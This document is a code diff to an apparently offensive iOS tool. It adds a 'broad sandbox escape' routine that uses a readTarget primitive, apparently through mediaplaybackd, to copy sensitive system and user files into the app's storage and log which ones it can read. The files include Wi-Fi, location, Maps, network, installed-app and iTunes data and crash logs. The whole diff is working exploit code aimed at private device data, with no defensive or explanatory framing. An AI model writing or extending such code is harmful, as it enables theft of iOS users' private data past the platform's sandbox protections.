@@ -528,6 +528,33 @@ static NSString *KPBSSHA256(NSData *data) {
             session.memoryRecipient = NULL;
         }
         [session log:@"END mode=%@ handshake=%d read=%d", mode, handshake, readOK];
+
+        // Broad sandbox escape: read everything mediaplaybackd can open
+        [session log:@"\n--- BROAD FILE SCAN ---"];
+        NSArray *targets = @[
+            @"/private/var/mobile/Library/Preferences/.GlobalPreferences.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.springboard.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.networkextension.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.locationd.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.radios.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.powerd.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.wifi.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.Maps.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.mobile.installation.plist",
+            @"/private/var/mobile/Media/iTunes_Control/iTunes/iTunes Library.itlp",
+            @"/private/var/mobile/Media/iTunes_Control/iTunes/Play Counts.plist",
+            @"/private/var/mobile/Library/Logs/CrashReporter/",
+            @"/private/var/mobile/Library/Logs/CrashReporter/DiagnosticLogs/",
+        ];
+        int readOK2 = 0;
+        for (NSString *t in targets) {
+            NSString *outName = [@"bs-" stringByAppendingString:t.lastPathComponent];
+            NSURL *outURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outName]];
+            BOOL ok = [session readTarget:t output:outURL];
+            [session log:@"SCAN %@ : %@", ok ? @"READ" : @"FAIL", t.lastPathComponent];
+            if (ok) readOK2++;
+        }
+        [session log:@"BROAD_SCAN: %d/%lu files readable", readOK2, (unsigned long)targets.count];
         @synchronized (session) {
             session.journalFD = -1;
         }
